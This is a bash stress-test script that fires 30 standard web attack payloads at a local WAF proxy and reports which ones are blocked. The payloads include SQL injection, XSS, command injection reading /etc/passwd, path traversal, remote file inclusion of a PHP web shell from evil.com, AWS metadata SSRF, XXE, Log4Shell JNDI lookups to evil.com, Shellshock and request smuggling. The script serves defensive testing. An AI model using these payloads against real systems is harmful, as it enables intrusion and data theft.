#!/usr/bin/env bash
# =====================================================================
#  Shibuya WAF — 30-Attack Stress Test (v2 - Properly Encoded)
# =====================================================================
#  Fires 30 real-world attack patterns against the WAF proxy on :8080
#  Each attack reports: BLOCKED ✅  or  PASSED ❌
# =====================================================================

set -euo pipefail

WAF_URL="${WAF_URL:-http://localhost:8080}"
PASS=0
BLOCK=0
TOTAL=0
RESULTS=()

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
PURPLE='\033[0;35m'
NC='\033[0m'
BOLD='\033[1m'

fire() {
    local category="$1"
    local name="$2"
    shift 2

    TOTAL=$((TOTAL + 1))
    
    # Execute curl, capture HTTP status code — use --globoff to prevent curl [] {} expansion
    HTTP_CODE=$(curl --globoff -s -o /dev/null -w "%{http_code}" --max-time 5 "$@" 2>/dev/null || echo "000")
    
    # WAF blocks typically return 403, 406, 429, or connection refused (000)
    if [[ "$HTTP_CODE" == "403" || "$HTTP_CODE" == "406" || "$HTTP_CODE" == "429" || "$HTTP_CODE" == "000" || "$HTTP_CODE" == "400" ]]; then
        BLOCK=$((BLOCK + 1))
        RESULTS+=("${GREEN}✅${NC} #${TOTAL} [${category}] ${name} → HTTP ${HTTP_CODE}")
    else
        PASS=$((PASS + 1))
        RESULTS+=("${RED}❌${NC} #${TOTAL} [${category}] ${name} → HTTP ${HTTP_CODE}")
    fi
    
    printf "  ${CYAN}%-3s${NC} ${PURPLE}%-20s${NC} %-40s " "#${TOTAL}" "[${category}]" "${name}"
    if [[ "$HTTP_CODE" == "403" || "$HTTP_CODE" == "406" || "$HTTP_CODE" == "429" || "$HTTP_CODE" == "000" || "$HTTP_CODE" == "400" ]]; then
        printf "${GREEN}BLOCKED ✅${NC} (${HTTP_CODE})\n"
    else
        printf "${RED}PASSED  ❌${NC} (${HTTP_CODE})\n"
    fi
    
    sleep 0.15
}

echo ""
echo -e "${BOLD}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BOLD}║       🔥  SHIBUYA WAF — 30 ATTACK STRESS TEST  🔥          ║${NC}"
echo -e "${BOLD}║            Target: ${WAF_URL}                      ║${NC}"
echo -e "${BOLD}╚══════════════════════════════════════════════════════════════╝${NC}"
echo ""

# Pre-flight: check WAF is up
echo -e "${YELLOW}▸ Pre-flight check...${NC}"
PREFLIGHT=$(curl --globoff -s -o /dev/null -w "%{http_code}" --max-time 3 "${WAF_URL}/health" 2>/dev/null || echo "000")
if [[ "$PREFLIGHT" == "000" ]]; then
    echo -e "${RED}✗ WAF is not responding on ${WAF_URL}. Start the WAF first!${NC}"
    exit 1
fi
echo -e "${GREEN}✓ WAF is responding (HTTP ${PREFLIGHT})${NC}"
echo ""

# ═══════════════════════════════════════════════════════
# CATEGORY 1: SQL INJECTION (3 attacks)
# ═══════════════════════════════════════════════════════
echo -e "${BOLD}━━━ SQL Injection ━━━${NC}"

fire "SQLi" "Classic OR 1=1" \
    "${WAF_URL}/user/1%27%20OR%201%3D1%20--"

fire "SQLi" "UNION SELECT" \
    "${WAF_URL}/user/1%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--"

fire "SQLi" "Blind Boolean SQLi" \
    "${WAF_URL}/user/1%27%20AND%201%3D1%20AND%20%27a%27%3D%27a"

echo ""

# ═══════════════════════════════════════════════════════
# CATEGORY 2: XSS (3 attacks)
# ═══════════════════════════════════════════════════════
echo -e "${BOLD}━━━ Cross-Site Scripting (XSS) ━━━${NC}"

fire "XSS" "Reflected script tag" \
    "${WAF_URL}/search?q=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E"

fire "XSS" "IMG onerror" \
    "${WAF_URL}/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E"

fire "XSS" "SVG onload" \
    "${WAF_URL}/search?q=%3Csvg%2Fonload%3Dalert%28%27xss%27%29%3E"

echo ""

# ═══════════════════════════════════════════════════════
# CATEGORY 3: COMMAND INJECTION (3 attacks)
# ═══════════════════════════════════════════════════════
echo -e "${BOLD}━━━ Command Injection ━━━${NC}"

fire "CMDi" "Semicolon ls" \
    "${WAF_URL}/search?q=test%3Bls%20-la%20%2Fetc"

fire "CMDi" "Pipe cat passwd" \
    "${WAF_URL}/search?q=test%7Ccat%20%2Fetc%2Fpasswd"

fire "CMDi" "Backtick exec" \
    "${WAF_URL}/search?q=%60id%60"

echo ""

# ═══════════════════════════════════════════════════════
# CATEGORY 4: PATH TRAVERSAL (3 attacks)
# ═══════════════════════════════════════════════════════
echo -e "${BOLD}━━━ Path Traversal ━━━${NC}"

fire "Traversal" "Classic ../../etc/passwd" \
    "${WAF_URL}/file?name=../../../../../../etc/passwd"

fire "Traversal" "Null byte injection" \
    "${WAF_URL}/file?name=../../etc/passwd%00.jpg"

fire "Traversal" "Double encoding" \
    "${WAF_URL}/file?name=..%252f..%252f..%252fetc%252fpasswd"

echo ""

# ═══════════════════════════════════════════════════════
# CATEGORY 5: LOCAL FILE INCLUSION (2 attacks)
# ═══════════════════════════════════════════════════════
echo -e "${BOLD}━━━ Local File Inclusion ━━━${NC}"

fire "LFI" "/etc/shadow read" \
    "${WAF_URL}/file?name=../../../../etc/shadow"

fire "LFI" "PHP filter wrapper" \
    "${WAF_URL}/file?name=php://filter/convert.base64-encode/resource=/etc/passwd"

echo ""

# ═══════════════════════════════════════════════════════
# CATEGORY 6: REMOTE FILE INCLUSION (2 attacks)
# ═══════════════════════════════════════════════════════
echo -e "${BOLD}━━━ Remote File Inclusion ━━━${NC}"

fire "RFI" "External shell.php" \
    "${WAF_URL}/file?name=http%3A%2F%2Fevil.com%2Fshell.php"

fire "RFI" "Data URI payload" \
    "${WAF_URL}/file?name=data%3A%2F%2Ftext%2Fplain%3Bbase64%2CPD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8%2B"

echo ""

# ═══════════════════════════════════════════════════════
# CATEGORY 7: SSRF (2 attacks)
# ═══════════════════════════════════════════════════════
echo -e "${BOLD}━━━ Server-Side Request Forgery (SSRF) ━━━${NC}"

fire "SSRF" "AWS metadata endpoint" \
    "${WAF_URL}/redirect?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F"

fire "SSRF" "Internal service probe" \
    "${WAF_URL}/redirect?url=http%3A%2F%2F127.0.0.1%3A22"

echo ""

# ═══════════════════════════════════════════════════════
# CATEGORY 8: XXE (2 attacks)
# ═══════════════════════════════════════════════════════
echo -e "${BOLD}━━━ XML External Entity (XXE) ━━━${NC}"

fire "XXE" "External entity /etc/passwd" \
    -X POST "${WAF_URL}/xml" \
    -H "Content-Type: application/xml" \
    -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'

fire "XXE" "Billion laughs DoS" \
    -X POST "${WAF_URL}/xml" \
    -H "Content-Type: application/xml" \
    -d '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><root>&lol2;</root>'

echo ""

# ═══════════════════════════════════════════════════════
# CATEGORY 9: LOG4SHELL / JNDI (2 attacks)
# ═══════════════════════════════════════════════════════
echo -e "${BOLD}━━━ Log4Shell / JNDI Injection ━━━${NC}"

fire "Log4Shell" "JNDI LDAP in header" \
    -H 'X-Api-Version: ${jndi:ldap://evil.com/exploit}' \
    "${WAF_URL}/"

fire "Log4Shell" "JNDI in User-Agent" \
    -H 'User-Agent: ${jndi:rmi://evil.com:1099/exploit}' \
    "${WAF_URL}/search?q=test"

echo ""

# ═══════════════════════════════════════════════════════
# CATEGORY 10: HEADER INJECTION (2 attacks)
# ═══════════════════════════════════════════════════════
echo -e "${BOLD}━━━ Header Injection ━━━${NC}"

fire "Header" "Shellshock User-Agent" \
    -H 'User-Agent: () { :; }; /bin/bash -c "cat /etc/passwd"' \
    "${WAF_URL}/"

fire "Header" "Host header attack" \
    -H "Host: evil.com" \
    -H "X-Forwarded-Host: evil.com" \
    "${WAF_URL}/admin"

echo ""

# ═══════════════════════════════════════════════════════
# CATEGORY 11: PROTOCOL ABUSE (2 attacks)
# ═══════════════════════════════════════════════════════
echo -e "${BOLD}━━━ Protocol Abuse ━━━${NC}"

fire "Protocol" "HTTP Request Smuggling" \
    -X POST "${WAF_URL}/" \
    -H "Transfer-Encoding: chunked" \
    -d $'0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n'

fire "Protocol" "Oversized cookie" \
    -H "Cookie: session=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
    "${WAF_URL}/"

echo ""

# ═══════════════════════════════════════════════════════
# CATEGORY 12: SCANNER FINGERPRINTS (2 attacks)
# ═══════════════════════════════════════════════════════
echo -e "${BOLD}━━━ Scanner Fingerprints ━━━${NC}"

fire "Scanner" "Nikto user agent" \
    -H "User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:map_codes)" \
    "${WAF_URL}/"

fire "Scanner" "SQLMap user agent" \
    -H "User-Agent: sqlmap/1.7.2#stable (https://sqlmap.org)" \
    "${WAF_URL}/user/1"

echo ""

# ═══════════════════════════════════════════════════════
# CATEGORY 13: RATE LIMIT FLOOD (2 attacks = 50 requests)
# ═══════════════════════════════════════════════════════
echo -e "${BOLD}━━━ Rate Limit Flood ━━━${NC}"
echo -ne "  ${CYAN}#29${NC} ${PURPLE}[RateLimit]${NC} Burst 25 requests..."
RATE_BLOCKED=0
for i in $(seq 1 25); do
    CODE=$(curl --globoff -s -o /dev/null -w "%{http_code}" --max-time 2 "${WAF_URL}/search?q=flood_${i}" 2>/dev/null || echo "000")
    if [[ "$CODE" == "429" || "$CODE" == "403" || "$CODE" == "000" ]]; then
        RATE_BLOCKED=$((RATE_BLOCKED + 1))
    fi
done
TOTAL=$((TOTAL + 1))
if [[ $RATE_BLOCKED -gt 5 ]]; then
    BLOCK=$((BLOCK + 1))
    RESULTS+=("${GREEN}✅${NC} #${TOTAL} [RateLimit] Burst 25 req → ${RATE_BLOCKED}/25 blocked")
    echo -e "          ${GREEN}BLOCKED ✅${NC} (${RATE_BLOCKED}/25 throttled)"
else
    PASS=$((PASS + 1))
    RESULTS+=("${RED}❌${NC} #${TOTAL} [RateLimit] Burst 25 req → ${RATE_BLOCKED}/25 blocked")
    echo -e "          ${RED}PASSED  ❌${NC} (${RATE_BLOCKED}/25 throttled)"
fi

echo -ne "  ${CYAN}#30${NC} ${PURPLE}[RateLimit]${NC} Burst 25 more (no delay)..."
RATE_BLOCKED2=0
for i in $(seq 1 25); do
    CODE=$(curl --globoff -s -o /dev/null -w "%{http_code}" --max-time 2 "${WAF_URL}/user/${i}" 2>/dev/null || echo "000")
    if [[ "$CODE" == "429" || "$CODE" == "403" || "$CODE" == "000" ]]; then
        RATE_BLOCKED2=$((RATE_BLOCKED2 + 1))
    fi
done
TOTAL=$((TOTAL + 1))
if [[ $RATE_BLOCKED2 -gt 5 ]]; then
    BLOCK=$((BLOCK + 1))
    RESULTS+=("${GREEN}✅${NC} #${TOTAL} [RateLimit] Burst 25 req → ${RATE_BLOCKED2}/25 blocked")
    echo -e "     ${GREEN}BLOCKED ✅${NC} (${RATE_BLOCKED2}/25 throttled)"
else
    PASS=$((PASS + 1))
    RESULTS+=("${RED}❌${NC} #${TOTAL} [RateLimit] Burst 25 req → ${RATE_BLOCKED2}/25 blocked")
    echo -e "     ${RED}PASSED  ❌${NC} (${RATE_BLOCKED2}/25 throttled)"
fi

echo ""

# ═══════════════════════════════════════════════════════
#  FINAL REPORT
# ═══════════════════════════════════════════════════════
BLOCK_RATE=$((BLOCK * 100 / TOTAL))

echo -e "${BOLD}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BOLD}║                    📊  FINAL REPORT                         ║${NC}"
echo -e "${BOLD}╠══════════════════════════════════════════════════════════════╣${NC}"
echo -e "${BOLD}║${NC}  Total Attacks:  ${YELLOW}${TOTAL}${NC}"
echo -e "${BOLD}║${NC}  Blocked:        ${GREEN}${BLOCK}${NC}  ✅"
echo -e "${BOLD}║${NC}  Passed:         ${RED}${PASS}${NC}  ❌"
echo -e "${BOLD}║${NC}  Block Rate:     ${YELLOW}${BLOCK_RATE}%${NC}"
echo -e "${BOLD}╠══════════════════════════════════════════════════════════════╣${NC}"
echo -e "${BOLD}║${NC}  Details:${NC}"
for r in "${RESULTS[@]}"; do
    echo -e "${BOLD}║${NC}    $r"
done
echo -e "${BOLD}╚══════════════════════════════════════════════════════════════╝${NC}"
echo ""

if [[ $BLOCK_RATE -ge 80 ]]; then
    echo -e "${GREEN}${BOLD}🛡️  EXCELLENT: WAF blocked ${BLOCK_RATE}% of attacks!${NC}"
elif [[ $BLOCK_RATE -ge 60 ]]; then
    echo -e "${YELLOW}${BOLD}⚠️  DECENT: WAF blocked ${BLOCK_RATE}% — consider raising paranoia level.${NC}"
else
    echo -e "${RED}${BOLD}❌ POOR: WAF only blocked ${BLOCK_RATE}% — check CRS rules and config!${NC}"
fi
echo ""
